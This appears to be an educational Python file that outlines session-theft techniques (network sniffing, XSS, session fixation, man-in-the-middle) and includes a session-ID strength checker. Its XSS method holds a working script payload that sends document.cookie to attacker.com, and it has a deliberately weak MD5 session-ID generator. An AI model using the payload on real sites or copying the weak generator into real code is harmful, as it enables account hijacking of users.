"""
Session Theft Algorithms - Educational Purposes Only
Understanding how session tokens can be stolen
"""

import hashlib
import random
import time
from typing import Dict, List, Optional

class SessionTheftMethods:
    """
    Educational class demonstrating session theft techniques
    """
    
    def __init__(self):
        self.stolen_sessions = {}
        self.attack_log = []
    
    def network_interception(self, target_session: str) -> Dict:
        """
        Method 1: Network-based session interception
        """
        attack_flow = {
            'step_1': 'Setup network monitoring',
            'step_2': 'Capture network packets',
            'step_3': 'Extract session cookies',
            'step_4': 'Replay session tokens',
            'success_rate': 'High on unsecured networks',
            'difficulty': 'Medium',
            'detection': 'Network monitoring tools'
        }
        
        # Simulate packet capture
        captured_data = {
            'session_id': target_session,
            'timestamp': time.time(),
            'source_ip': '192.168.1.100',
            'destination_ip': '192.168.1.1',
            'protocol': 'HTTP/HTTPS'
        }
        
        self.attack_log.append({
            'method': 'network_interception',
            'target': target_session,
            'data': captured_data,
            'success': True
        })
        
        return attack_flow
    
    def xss_attack(self, vulnerable_url: str) -> Dict:
        """
        Method 2: Cross-Site Scripting session theft
        """
        # Malicious JavaScript payload
        xss_payload = """
        <script>
        // Steal session cookie
        var sessionCookie = document.cookie;
        
        // Send to attacker's server
        fetch('https://attacker.com/steal', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                cookie: sessionCookie,
                url: window.location.href,
                timestamp: Date.now()
            })
        });
        </script>
        """
        
        attack_flow = {
            'step_1': 'Find XSS vulnerability',
            'step_2': 'Craft malicious payload',
            'step_3': 'Inject script into page',
            'step_4': 'Execute in victim\'s browser',
            'step_5': 'Steal session cookies',
            'payload': xss_payload,
            'success_rate': 'High if XSS exists',
            'difficulty': 'Medium',
            'detection': 'WAF, CSP headers'
        }
        
        return attack_flow
    
    def session_fixation(self, target_user: str) -> Dict:
        """
        Method 3: Session fixation attack
        """
        # Generate predictable session ID
        predictable_session = self.generate_predictable_session(target_user)
        
        attack_flow = {
            'step_1': 'Generate predictable session ID',
            'step_2': 'Set session ID in victim\'s browser',
            'step_3': 'Wait for victim to login',
            'step_4': 'Session becomes authenticated',
            'step_5': 'Use same session ID',
            'predictable_session': predictable_session,
            'success_rate': 'Medium',
            'difficulty': 'Low',
            'detection': 'Session validation'
        }
        
        return attack_flow
    
    def man_in_middle(self, target_session: str) -> Dict:
        """
        Method 4: Man-in-the-Middle attack
        """
        attack_flow = {
            'step_1': 'Position between victim and server',
            'step_2': 'Intercept all traffic',
            'step_3': 'Modify requests/responses',
            'step_4': 'Steal session tokens',
            'step_5': 'Impersonate victim',
            'techniques': [
                'ARP spoofing',
                'DNS poisoning',
                'WiFi eavesdropping',
                'SSL stripping'
            ],
            'success_rate': 'High on unsecured networks',
            'difficulty': 'Medium',
            'detection': 'Certificate warnings, network monitoring'
        }
        
        return attack_flow
    
    def generate_predictable_session(self, user_id: str) -> str:
        """
        Generate predictable session ID (for educational purposes)
        """
        # Weak session generation (DO NOT USE IN PRODUCTION)
        timestamp = int(time.time())
        weak_hash = hashlib.md5(f"{user_id}{timestamp}".encode()).hexdigest()
        return weak_hash[:16]
    
    def analyze_session_strength(self, session_id: str) -> Dict:
        """
        Analyze how strong a session ID is
        """
        analysis = {
            'length': len(session_id),
            'entropy': self.calculate_entropy(session_id),
            'predictability': self.assess_predictability(session_id),
            'recommendations': []
        }
        
        if len(session_id) < 32:
            analysis['recommendations'].append('Session ID too short')
        
        if analysis['entropy'] < 3.0:
            analysis['recommendations'].append('Low entropy detected')
        
        if analysis['predictability'] > 0.7:
            analysis['recommendations'].append('Highly predictable')
        
        return analysis
    
    def calculate_entropy(self, session_id: str) -> float:
        """
        Calculate entropy of session ID
        """
        import math
        char_count = {}
        for char in session_id:
            char_count[char] = char_count.get(char, 0) + 1
        
        entropy = 0
        length = len(session_id)
        for count in char_count.values():
            probability = count / length
            entropy -= probability * math.log2(probability)
        
        return entropy
    
    def assess_predictability(self, session_id: str) -> float:
        """
        Assess how predictable a session ID is
        """
        # Simple predictability assessment
        patterns = [
            session_id.isdigit(),
            session_id.isalpha(),
            session_id.islower(),
            session_id.isupper(),
            len(set(session_id)) < len(session_id) * 0.5
        ]
        
        predictability_score = sum(patterns) / len(patterns)
        return predictability_score

# Example usage (educational purposes only)
if __name__ == "__main__":
    session_theft = SessionTheftMethods()
    
    # Example session ID
    example_session = "abc123def456ghi789"
    
    # Analyze session strength
    analysis = session_theft.analyze_session_strength(example_session)
    print("Session Analysis:", analysis)
    
    # Demonstrate attack methods
    print("\nAttack Methods:")
    print("1. Network Interception:", session_theft.network_interception(example_session))
    print("2. XSS Attack:", session_theft.xss_attack("http://example.com"))
    print("3. Session Fixation:", session_theft.session_fixation("user123"))
    print("4. Man-in-Middle:", session_theft.man_in_middle(example_session)) 